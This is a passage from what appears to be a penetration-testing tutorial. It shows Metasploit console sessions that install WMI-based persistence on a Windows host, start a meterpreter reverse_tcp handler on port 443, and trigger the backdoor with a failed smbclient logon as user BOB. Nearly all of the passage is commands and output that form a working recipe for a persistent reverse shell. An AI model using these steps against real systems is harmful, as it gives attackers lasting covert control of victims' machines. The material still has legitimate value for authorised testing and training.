```
LHOST => 192.168.216.5
msf exploit(wmi_persistence) > set LPORT 443
LPORT => 443
[*] Installing Persistence...
[+] - Bytes remaining: 12260
[+] - Bytes remaining: 4260
[+] Payload successfully staged.
[+] Persistence installed! Call a shell using
"smbclient \\\\192.168.216.10\\C$ -U BOB
<arbitrary password>"
[*] Clean up Meterpreter RC file: /root/.msf4
/logs/wmi_persistence/192.168.216.10_20171127.1028
/192.168.216.10_20171127.1028.rc
msf exploit(wmi_persistence) >
```

3. With our persistence in place, we need to start a listener using the Generic Payload Handler module:

```
msf exploit(wmi_persistence) > use exploit
/multi/handler
msf exploit(handler) > set PAYLOAD windows
/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.216.5:443
```

4. To get a session back, we need to generate an event ID 4625 (an account failed to log on) with the username BOB, which will trigger the payload. For that, we will use the smbclient command:

```
root@kali:~# smbclient \\\\192.168.216.10\\C$
-U BOB BLA
WARNING: The "syslog" option is deprecated
session setup failed: NT_STATUS_LOGON_FAILURE
root@kali:~#
```